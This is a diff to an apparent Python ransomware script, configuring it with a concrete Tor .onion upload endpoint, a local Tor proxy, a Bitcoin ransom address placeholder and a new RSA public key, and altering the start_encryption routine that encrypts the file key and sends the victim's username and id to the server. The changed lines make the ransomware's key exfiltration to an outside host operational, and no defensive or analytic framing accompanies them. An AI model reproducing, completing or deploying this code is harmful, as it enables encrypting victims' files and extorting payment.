@@ -40,22 +40,28 @@ from Crypto.Random import get_random_bytes
 from zeroize import zeroize1, mlock, munlock
 
 # Decode the encoded URL using the dx42 function.
-YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()  # Replace with your encoded URL
+YOUR_URL = "http://r5iskohpx4wi2kcmvrppwglkkpnz6roasj3bsj4hgzqakapoq5yrs2qd.onion/upload"  # Replace with your encoded URL
 # Encode a URL using the ex42 function from the edx42 module
 # Example: encoded_url = ex42(b"https://your-tor-server.onion".encode())
-YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()  # Replace with your encoded proxy
-YOUR_BITCOIN_ADDRESS = "YOUR_BITCOIN_ADDRESS"
-YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()
+YOUR_PROXY = "127.0.0.1:9050"  # Replace with your encoded proxy
+YOUR_BITCOIN_ADDRESS = "MY_BITCOIN_ADDRESS"
+YOUR_EMAIL_ADDRESS = "MY_ENCODED_EMAIL_ADDRESS"
 id = ""
 
-RSA_PUBLIC_KEY = """-----BEGIN RSA PUBLIC KEY-----
-MIIBCgKCAQEAjdIcVka2US3tcvXqQ90+XNYt5bJv10x+/0KRSph03Z/RIp/gOID2
-EEoF2Gs44BKj1C5UJsP8MyFHhWKob+WVA2vkUca2ZkA4EYxelivKGaEQlUmnBQJs
-rmniCu6afj5Gq6mazVPIm48G20g8JS/ckkvJK9TAbLkqk9HQT9waIbhwuBydKlcp
-xwPO3CZstFT3YWB+WQS0waPxqbB1PFGqPsYpPM5uBFYKj9aXXec7g6Xg992jFJ3j
-8qQ2oi05KRe5OHrMvQNXd7vAfSjzguXKX5gHpY9z8iNTPwU5XBsQCGmQnvxdtH80
-fqhDqfh8hZncYtvFGPfJ8g1TfN2huFjYzwIDAQAB
------END RSA PUBLIC KEY-----"""  # Replace with your public key if needed
+RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAnCK4qHp0Ie/ClNE4nUaN
+wa8L36BKek8FoA0+hkUsEFdl/85M8D1sMkniG7ytzATcroLT2fmBuJP+HE0GJu8T
+eHh2YkFMaohRVtGGdNUKmOFuDnNcSayXlWGnbhGBp5OJHYuVBOk25IsZtit0pjDJ
+u0/zJy3hfXGagC0v+xl62kYzJjrKvcuFZ0oHdxvrtGr9KZ9mMGOdw3bGYPGyM97u
+xOVoudnC/0WxF+/srv2NEEHWumo1EyAGTd9bRWiiihfaX6ThAjuVWKx4wC2fT7KI
+Lo8/gVi8VfFoy1tfZ8++ehxUXQuhJX7wcLnNm7FmMjO5FzJlCa/nWF7FnlVzc2V5
+cDtIGTBAg3J1QwAylgECO4lwFhaZ3AE9sUHJf/6o/TjXf8Wm6qk0OP/mE7Xps+tC
+IIQxQez4NdGwZwUuOeV3O60xeRwzrNP5W/n0xu33rvuGZFCN2xbSUJpq93jNTqr8
+j2i4iYNNBE/Upy5a068ENukV8FeswaZ+1bVbtivFEFKUwq2ACFRpWYTFXXsc605D
+/mVZn4oZjcs024o4QF6eKNyeW9eOyXcL+Q7T5WEexIfAfFVsiaG5vvjRS9aoigN0
+gCnFTWHHUYN7SsuCUlWqlyHfO3W7s8NTSPm8F7uoAzRkRgpGF3WjSblJWsz9fuAw
+9uTrsCjzkyencwnXJwLxQVMCAwEAAQ==
+-----END PUBLIC KEY-----"""  # Replace with your public key if needed
 
 
 def is_admin():
@@ -369,7 +375,8 @@ def start_encryption():
     try:
         mlock(key)
         mlock(key_b64)
-        encrypted_key = encrypt_key(bytes(key_b64.encode()))
+        # print(key_b64.decode())
+        encrypted_key = encrypt_key(bytes(key_b64))
         data = {
             "username": getpass.getuser(),
             "id": str(id),
